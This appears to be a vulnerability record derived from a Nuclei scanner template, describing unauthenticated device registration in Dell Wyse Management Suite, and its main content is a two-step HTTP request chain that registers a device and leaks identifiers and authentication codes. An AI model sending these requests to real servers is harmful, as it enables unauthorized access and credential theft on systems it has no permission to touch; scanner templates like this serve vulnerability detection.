# Vulnerability: Dell Wyse Management Suite - Unauthenticated Device Registration
**Classification:** DELL
**Source:** Nuclei Template (`wyse-devicegroup-register.yaml`)

## Description
Dell Wyse Management Suite allows unauthenticated device registration by chaining deviceGroupLogin2 and deviceRegister endpoints, leaking wyseIdentifier and authenticationCode.

## Vulnerable Code Pattern / Exploit Payload
```http
POST /ccm-web/open/deviceGroupLogin2 HTTP/1.1
Host: {{Hostname}}
User-Agent: RMA
Content-Type: application/json; charset=UTF-8

{}

POST /ccm-web/open/deviceRegister HTTP/1.1
Host: {{Hostname}}
User-Agent: RMA
Content-Type: application/json; charset=UTF-8
X-Stratus-device-owner-id: {{owner_id}}

{"deviceType":{"type":81},"owner":{"id":{{owner_id}}},"macAddress":"ff:ff:ff:ff:ff:ff"}
```

